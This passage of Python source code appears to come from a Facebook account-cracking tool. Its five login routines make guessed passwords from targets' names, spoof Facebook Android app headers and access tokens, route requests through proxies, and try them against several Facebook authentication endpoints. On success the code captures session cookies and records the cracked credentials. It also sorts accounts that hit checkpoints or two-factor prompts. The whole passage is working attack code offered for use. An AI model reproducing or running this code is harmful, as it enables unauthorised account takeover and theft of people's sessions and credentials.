                        "x-fb-session-id": f"nid={uuid.uuid4().hex};pid=Main;tid={random.randint(100,500)};nc=1;fc=0;bc=0;cid={uuid.uuid4().hex}",
                        "x-fb-device-group": str(random.randint(4000, 6000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Request-Analytics-Tags": "graphservice",
                        "X-FB-HTTP-Engine": "Liger",
                        "X-FB-Client-IP": "True",
                        "X-FB-Server-Cluster": "True",
                        "x-fb-connection-token": uuid.uuid4().hex,
                    }
                    url = "https://graph.facebook.com/auth/login"

                    try:
                        response = requests.post(url, data=data, headers=headers, timeout=(5, 15), proxies=PROXY)
                        po = response.json()
                    except requests.exceptions.Timeout:
                        continue
                    except Exception:
                        continue

                    result, po_data = self._check_response(po, ids, pas, "M1")
                    
                    if result == 'ok':
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
                        print(f'\r{xp}{W}-{G}<[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas + '\033[1;97m')
                        if 'y' in self.__COOKIE__:
                            colorX = random.choice([
                                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                            ])
                            print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M1')
                        self.oks.append(ids)
                        break

                    elif result == 'cp':
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', 'cp', 'M1')
                        self.cps.append(ids)
                        break

                    elif result == '2f':
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', '2f', 'M1')
                        self.twf.append(ids)
                        break
                    else:
                        continue
                        
                self.loop += 1
                break
                
            except Exception as e:
                retry_count += 1
                if retry_count > max_retries:
                    break
                time.sleep(1)

    #----------------<-FILE-M2-B-GRAPH (MODIFIED)->----------------#
    def __M2X__(self, ids, names, passlist):
        retry_count = 0
        max_retries = 2
        
        while retry_count <= max_retries:
            try:
                color = random.choice([
                    "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                    "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                    "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                ])
                sys.stdout.write(
                    f'\r{xp}{W}-{G}<[{W}PS{G}-{W}{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M2{G}]>{W}-{G}<[{G}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{P}{len(self.cps)}{G}]> '
                )
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                    ln = names.split(' ')[1]
                except:
                    ln = fn
                for pw in passlist:
                    pas = pw.replace('first', fn.lower()) \
                            .replace('First', fn) \
                            .replace('last', ln.lower()) \
                            .replace('Last', ln) \
                            .replace('Name', names) \
                            .replace('name', names.lower())
                    ua = _____UpDaTe_S1_____()  # الآن تستخدم النماذج المحملة
                    accessToken = random.choice([
                        '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                    ])
                    random_seed = random.Random()
                    pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                    adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                    device_id = str(uuid.uuid4())
                    __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                        "pt_BR": "BR"
                    }
                    country_locale = random.choice(list(__locale__.keys()))
                    country_code = __locale__[country_locale]
                    data = {
                        'adid': adid,
                        'format': 'json',
                        'device_id': device_id,
                        'email': ids,
                        'password': f"#{pax}:0:{int(time.time())}:{pas}",
                        'generate_analytics_claims': '1',
                        'community_id': '',
                        'cpl': 'true',
                        'try_num': '1',
                        'family_device_id': str(uuid.uuid4()),
                        'credentials_type': 'password',
                        'source': 'login',
                        'error_detail_type': 'button_with_disabled',
                        'enroll_misauth': 'false',
                        'generate_session_cookies': '1',
                        'generate_machine_id': '1',
                        'currently_logged_in_userid': '0',
                        'locale': country_locale,
                        'client_country_code': country_code,
                        'fb_api_req_friendly_name': 'authenticate',
                        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                        'access_token': f'{accessToken}',
                    }
                    headers = {
                        'User-Agent': ua,
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'close',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                        'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                        'Authorization': f'OAuth {accessToken}',
                        'X-FB-Connection-Type': random.choice(["CELL.4G", "WIFI", "MOBILE.LTE", "CELL.5G"]),
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-session-id': f'nid={uuid.uuid4().hex};pid=Main;tid={random.randint(100,500)};nc=1;fc=0;bc=0;cid={uuid.uuid4().hex}',
                        'x-fb-device-group': str(random.randint(4000, 6000)),
                        'X-FB-Friendly-Name': 'authenticate',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'x-fb-connection-token': uuid.uuid4().hex,
                    }
                    url = "https://b-graph.facebook.com/auth/login"
                    
                    try:
                        response = requests.post(url, data=data, headers=headers, timeout=(5, 15), proxies=PROXY)
                        po = response.json()
                    except:
                        continue

                    result, po_data = self._check_response(po, ids, pas, "M2")
                    
                    if result == 'ok':
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
                        print(f'\r{xp}{W}-{G}<[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas + '\033[1;97m')
                        if 'y' in self.__COOKIE__:
                            colorX = random.choice([
                                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                            ])
                            print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M2')
                        self.oks.append(ids)
                        break
                        
                    elif result == 'cp':
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', 'cp', 'M2')
                        self.cps.append(ids)
                        break
                        
                    elif result == '2f':
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', '2f', 'M2')
                        self.twf.append(ids)
                        break
                    else:
                        continue
                        
                self.loop += 1
                break
                
            except Exception:
                retry_count += 1
                if retry_count > max_retries:
                    break
                time.sleep(1)

    #----------------<-FILE-M3-API (MODIFIED)->----------------#
    def __M3X__(self, ids, names, passlist):
        retry_count = 0
        max_retries = 2
        
        while retry_count <= max_retries:
            try:
                color = random.choice([
                    "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                    "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                    "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                ])
                sys.stdout.write(
                    f'\r[/]{W}{G}[{W}PS{G}-{W}{G}]{W}{G}[{color}{self.loop}{G}+{W}M3{G}]{W}{G}[{G}{len(self.oks)}{G}+{Y}{len(self.twf)}{G}+{P}{len(self.cps)}{G}] '
                )
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                    ln = names.split(' ')[1]
                except:
                    ln = fn
                for pw in passlist:
                    pas = pw.replace('first', fn.lower()) \
                            .replace('First', fn) \
                            .replace('last', ln.lower()) \
                            .replace('Last', ln) \
                            .replace('Name', names) \
                            .replace('name', names.lower())
                    ua = _____UpDaTe_S2_____()  # الآن تستخدم النماذج المحملة
                    accessToken = random.choice([
                        '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                    ])
                    random_seed = random.Random()
                    pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                    adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                    device_id = str(uuid.uuid4())
                    __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                        "pt_BR": "BR"
                    }
                    country_locale = random.choice(list(__locale__.keys()))
                    country_code = __locale__[country_locale]
                    data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "access_token": f"{accessToken}",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": country_locale,
                        "client_country_code": country_code,
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"
                    }
                    headers = {
                        "User-Agent": ua,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Host": "graph.facebook.com",
                        "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Connection-Type": random.choice(["CELL.4G", "WIFI", "MOBILE.LTE", "CELL.5G"]),
                        "X-Tigon-Is-Retry": "False",
                        "x-fb-session-id": f"nid={uuid.uuid4().hex};pid=Main;tid={random.randint(100,500)};nc=1;fc=0;bc=0;cid={uuid.uuid4().hex}",
                        "x-fb-device-group": str(random.randint(4000, 6000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Request-Analytics-Tags": "graphservice",
                        "X-FB-HTTP-Engine": "Liger",
                        "X-FB-Client-IP": "True",
                        "X-FB-Server-Cluster": "True",
                        "x-fb-connection-token": uuid.uuid4().hex,
                    }
                    url = "https://api.facebook.com/auth/login"
                    
                    try:
                        response = requests.post(url, data=data, headers=headers, timeout=(5, 15), proxies=PROXY)
                        po = response.json()
                    except:
                        continue

                    result, po_data = self._check_response(po, ids, pas, "M3")
                    
                    if result == 'ok':
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                        print(f'\r[/]{W}-{G}[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas + '\033[1;97m')
                        if 'y' in self.__COOKIE__:
                            colorX = random.choice([
                                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                            ])
                            print(f'\r[/]{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M3')
                        self.oks.append(ids)
                        break
                        
                    elif result == 'cp':
                        if 'y' in self.__CP__:
                            print(f'\r[/]{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', 'cp', 'M3')
                        self.cps.append(ids)
                        break
                        
                    elif result == '2f':
                        if 'y' in self.__CP__:
                            print(f'\r[/]{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', '2f', 'M3')
                        self.twf.append(ids)
                        break
                    else:
                        continue
                        
                self.loop += 1
                break
                
            except Exception:
                retry_count += 1
                if retry_count > max_retries:
                    break
                time.sleep(1)

    #----------------<-FILE-M4-B-API (MODIFIED)->----------------#
    def __M4X__(self, ids, names, passlist):
        retry_count = 0
        max_retries = 2
        
        while retry_count <= max_retries:
            try:
                color = random.choice([
                    "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                    "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                    "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                ])
                sys.stdout.write(
                    f'\r{xp}{W}-{G}<[{W}PS{G}-{W}{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M4{G}]>{W}-{G}<[{G}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{P}{len(self.cps)}{G}]> '
                )
                sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                    ln = names.split(' ')[1]
                except:
                    ln = fn
                for pw in passlist:
                    pas = pw.replace('first', fn.lower()) \
                            .replace('First', fn) \
                            .replace('last', ln.lower()) \
                            .replace('Last', ln) \
                            .replace('Name', names) \
                            .replace('name', names.lower())
                    ua = _____UpDaTe_S2_____()  # الآن تستخدم النماذج المحملة
                    accessToken = random.choice([
                        '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                    ])
                    random_seed = random.Random()
                    pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                    adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                    device_id = str(uuid.uuid4())
                    data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "session_id": str(uuid.uuid4()),
                        "advertiser_id": str(uuid.uuid4()),
                        "reg_instance": str(uuid.uuid4()),
                        "logged_out_id": str(uuid.uuid4()),
                        "hash_id": str(uuid.uuid4()),
                        "sim_country": random.choice(["us", "gb", "fr", "de", "sa"]),
                        "network_country": random.choice(["us", "gb", "fr", "de", "sa"]),
                        "enroll_misauth": "false",
                        "generate_analytics_claims": "1",
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "cpl": "true",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "meta_inf_fbmeta": "",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    }
                    headers = {
                        "Authorization": f"OAuth {accessToken}",
                        "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                        "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Friendly-Name": "authenticate",
                        "X-FB-Connection-Type": random.choice(["CELL.4G", "WIFI", "MOBILE.LTE", "CELL.5G"]),
                        "User-Agent": ua,
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-FB-HTTP-Engine": "Liger"
                    }
                    url = "https://b-api.facebook.com/method/auth.login"
                    
                    try:
                        response = requests.post(url, data=data, headers=headers, timeout=(5, 15), proxies=PROXY)
                        po = response.json()
                    except:
                        continue

                    result, po_data = self._check_response(po, ids, pas, "M4")
                    
                    if result == 'ok':
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
                        print(f'\r{xp}{W}-{G}<[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas + '\033[1;97m')
                        if 'y' in self.__COOKIE__:
                            colorX = random.choice([
                                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                            ])
                            print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M4')
                        self.oks.append(ids)
                        break
                        
                    elif result == 'cp':
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', 'cp', 'M4')
                        self.cps.append(ids)
                        break
                        
                    elif result == '2f':
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', '2f', 'M4')
                        self.twf.append(ids)
                        break
                    else:
                        continue
                        
                self.loop += 1
                break
                
            except Exception:
                retry_count += 1
                if retry_count > max_retries:
                    break
                time.sleep(1)

    #----------------<-FILE-M5-ANDROID-API (ALREADY USING MODELS)->----------------#
    def __M5X__(self, ids, names, passlist):
        retry_count = 0
        max_retries = 2
        
        while retry_count <= max_retries:
            try:
                color = random.choice([
                    "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                    "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                    "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                ])
                sys.stdout.write(
                    f'\r{xp}{W}-{G}<[{W}PS{G}-{W}{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M5{G}]>{W}-{G}<[{G}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
                )
                sys.stdout.flush()
                
                fn = names.split(' ')[0]
                try:
                    ln = names.split(' ')[1]
                except:
                    ln = fn
                    
                for pw in passlist:
                    pas = pw.replace('first', fn.lower()) \
                            .replace('First', fn) \
                            .replace('last', ln.lower()) \
                            .replace('Last', ln) \
                            .replace('Name', names) \
                            .replace('name', names.lower())
                    
                    ua = _____UpDaTe_S3_____()  # تستخدم النماذج المحملة
                    accessToken = random.choice([
                        '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                    ])
                    random_seed = random.Random()
                    pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                    adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                    device_id = str(uuid.uuid4())
                    secure_family_device_id = str(uuid.uuid4())
                    
                    data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "generate_analytics_claim": "1",
                        "community_id": "",
                        "cpl": "true",
                        "try_num": "1",
                        "family_device_id": str(uuid.uuid4()),
                        "secure_family_device_id": secure_family_device_id,
                        "credentials_type": "password",
                        "generate_session_cookies": "1",
                        "error_detail_type": "button_with_disabled",
                        "source": "login",
                        "generate_machine_id": "1",
                        "currently_logged_in_userid": "0",
                        "locale": "ar_AR",
                        "client_country_code": "EG",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d",
                        "access_token": accessToken,
                    }                
                    
                    headers = {
                        "User-Agent": ua,
                        "Accept-Encoding": "gzip, deflate",
                        "x-fb-connection-quality": "EXCELLENT",
                        "x-fb-friendly-name": "authenticate",
                        "x-fb-http-engine": "Liger",
                        "x-fb-client-ip": "True",
                        "x-fb-server-cluster": "True",
                        "authorization": f"OAuth {accessToken}",
                    }

                    url = "https://b-graph.facebook.com/auth/login"
                    
                    try:
                        response = requests.post(url, data=data, headers=headers, timeout=(5, 15), proxies=PROXY)
                        po = response.json()
                    except:
                        continue

                    result, po_data = self._check_response(po, ids, pas, "M5")
                    
                    if result == 'ok':
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
                        print(f'\r{xp}{W}-{G}<[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas + '\033[1;97m')
                        if 'y' in self.__COOKIE__:
                            colorX = random.choice([
                                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                            ])
                            print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M5')
                        self.oks.append(ids)
                        break
                        
                    elif result == 'cp':
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', 'cp', 'M5')
                        self.cps.append(ids)
                        break
                        
                    elif result == '2f':
                        if 'y' in self.__CP__:
                            print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
                        self._save_results(ids, pas, '', '2f', 'M5')
                        self.twf.append(ids)
                        break
                    else:
                        continue
                        
                self.loop += 1
                break
                
            except Exception:
                retry_count += 1
                if retry_count > max_retries:
                    break
                time.sleep(1)

#----------------<-LAST-CALL->----------------#
if __name__ == "__main__":
    load_models_from_github()
    __SEAXNOOR__().__MENU__()